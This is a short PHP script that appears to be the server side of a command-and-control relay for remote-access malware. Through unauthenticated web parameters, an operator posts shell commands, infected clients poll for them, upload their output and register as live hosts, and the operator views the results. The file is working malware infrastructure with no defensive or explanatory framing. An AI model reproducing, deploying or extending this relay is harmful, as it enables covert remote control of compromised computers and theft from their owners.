<?php 
    function newcmd($value){
        $arquivo = "send.txt";
        $conteudo = fopen($arquivo, "w");
        $write = $value;
        fwrite($conteudo, $write);
        fclose($conteudo);
    }
    function get_cmd(){
        $arquivo = "send.txt";
        $conteudo = fopen($arquivo, "r");
        $cmd = fread($conteudo, filesize($arquivo));
        echo $cmd;
        fclose($conteudo);
    }
    function set_out($output){
        $arquivo = "output.txt";
        $conteudo = fopen($arquivo, "w");
        fwrite($conteudo, $output);
        fclose($conteudo);
    }
    function get_output(){
        $arquivo = "output.txt";
        $conteudo = fopen($arquivo, "r");
        $cmd = fread($conteudo, filesize($arquivo));
        header("Content-type: text/html; charset=utf-8");
        echo "<meta http-equiv='Content-Type' content='text/html; charset=utf-8' /><body><pre><center>".$cmd;
        fclose($conteudo);
    }
    function get_alives(){
        $arquivo = "existentes.txt";
        $conteudo = fopen($arquivo, "r");
        $cmd = fread($conteudo, filesize($arquivo));
        echo $cmd;
        fclose($conteudo);
    }
    function new_alive($value){
        $arquivo = "existentes.txt";
        $conteudo = fopen($arquivo, "r");
        $cmd = fread($conteudo, filesize($arquivo));
        fclose($conteudo);
        $conteudo = fopen($arquivo, "w");
        fwrite($conteudo, $cmd.$value."\n");
        fclose($conteudo);
    }
    function clear_out(){
        $arquivo = "output.txt";
        $conteudo = fopen($arquivo, "w");
        fwrite($conteudo, "");
        fclose($conteudo);
    }
    if(isset($_POST['put_cmd'])){
        newcmd($_POST['put_cmd']);
    }
    if(isset($_GET['get_cmd'])){
        get_cmd();
    }
    if(isset($_POST['set_out'])){
        set_out($_POST['set_out']);
    }
    if(isset($_GET['get_out'])){
        get_output();
    }
    if(isset($_POST['new_alive'])){
        new_alive($_POST['new_alive']);
    }
    if(isset($_GET['get_alive'])){
        get_alives();
    }
    if(isset($_GET['clear_out'])){
        clear_out();
    }
?>